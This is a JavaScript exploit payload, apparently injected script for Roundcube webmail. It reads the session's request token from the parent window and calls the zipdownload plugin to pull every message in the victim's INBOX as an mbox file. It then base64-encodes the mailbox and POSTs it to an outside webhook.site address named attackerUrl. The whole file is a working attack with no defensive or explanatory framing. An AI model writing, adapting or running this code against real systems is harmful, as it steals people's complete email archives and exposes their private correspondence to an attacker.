const config_hfgskadhgfk = {
    attackerUrl: "https://webhook.site/30e7aeb0-079c-4def-8854-09446e3067ae/leak2",
    downloadUrl: "?_task=mail&_action=plugin.zipdownload.messages",
    mailbox: "INBOX",
    downloadMode: "mbox"
};

function executeExploit_hfsgdjkhf() {
    console.log("Starting exploit...");
    extractAllEmails().catch(error => {
        console.error("Error extracting all emails:", error);
    });
}
async function extractAllEmails() {
    try {
        console.log("Attempting to extract all emails at once");
        await downloadAndExfiltrateEmails('*');
    } catch (error) {
        console.error("Error in extractAllEmails:", error);
        throw error;
    }
}
async function downloadAndExfiltrateEmails(uidValue) {
    try {
        const formData = new FormData();
        formData.append('_uid', uidValue);
        formData.append('_mbox', config_hfgskadhgfk.mailbox);
        formData.append('_mode', config_hfgskadhgfk.downloadMode);
        formData.append('_token', parent.rcmail.env.request_token);
        console.log(`Requesting download for uid: ${uidValue}`);
        const response = await fetch(config_hfgskadhgfk.downloadUrl, {
            method: 'POST',
            body: formData
        });
        if (!response.ok) {
            throw new Error(`Download failed with status: ${response.status}`);
        }
        const blob = await response.blob();
        const base64data = await blobToBase64(blob);
        console.log("Exfiltrating data...");
        await exfiltrateData(base64data);
        console.log("Exfiltration completed");
    } catch (error) {
        console.error("Error in downloadAndExfiltrateEmails:", error);
        throw error;
    }
}

function blobToBase64(blob) {
    return new Promise((resolve, reject) => {
        const reader = new FileReader();
        reader.readAsDataURL(blob);
        reader.onloadend = () => resolve(reader.result);
        reader.onerror = reject;
    });
}
async function exfiltrateData(data) {
    try {
        await fetch(config_hfgskadhgfk.attackerUrl, {
            method: 'POST',
            body: data,
            mode: 'no-cors'
        });
    } catch (error) {
        console.error("Error sending data to attacker server:", error);
        throw error;
    }
}
executeExploit_hfsgdjkhf();
